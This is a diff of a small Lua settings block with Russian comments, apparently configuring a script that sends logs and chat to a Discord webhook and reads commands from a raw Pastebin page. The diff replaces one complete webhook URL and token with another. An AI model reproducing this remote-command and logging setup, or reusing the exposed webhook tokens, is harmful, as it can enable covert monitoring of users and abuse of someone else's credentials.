@@ -1,7 +1,7 @@
 -- [[ CONFIG ]] --
 local settings = {
     -- Твой Discord Webhook для получения логов и чата
-    webhook = "https://discord.com/api/webhooks/1464945164584747190/cR2qV7opyFlK3id2k-tZVEu8ALLn9wMDxEZdj66IaRNGnHl0Vn_AwjwtWrEjxjaSkN8_",
+    webhook = "https://discord.com/api/webhooks/1464946131971604502/BeusAylciHGUFqcIyOsrQdymegpkb37kW7arx9zsxVX51An6GWXTSNFJXm0C-KWadIKT",
     -- Ссылка на Pastebin (в формате RAW), где ты пишешь команды
     control = "https://pastebin.com/raw/EsjZSDrA",
     -- Как часто проверять команды (в секундах)
